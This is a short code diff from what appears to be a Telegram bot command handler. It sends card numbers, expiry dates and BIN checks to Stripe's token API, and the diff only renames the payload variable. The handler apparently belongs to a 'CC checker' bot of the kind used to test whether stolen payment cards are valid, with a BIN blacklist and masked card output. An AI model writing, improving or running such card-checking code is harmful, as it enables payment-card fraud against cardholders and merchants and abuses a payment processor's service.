@@ -312,7 +312,7 @@ async def ch(message: types.Message):
         BIN = ccn[:6]
         if BIN in BLACKLISTED:
             return await message.reply('<b>BLACKLISTED BIN</b>')
-       load = {
+       ploadne = {
             "card[number]": ccn,
             "card[exp_month]": mm,
             "card[exp_year]": yy,
@@ -331,7 +331,7 @@ async def ch(message: types.Message):
         }
 
         rx = session.post('https://api.stripe.com/v1/tokens',
-                          data=load, headers=header)
+                          data=ploadne, headers=header)
         token = rx.json()['id']
         LastF = f'************{ccn[-4:]}'
 
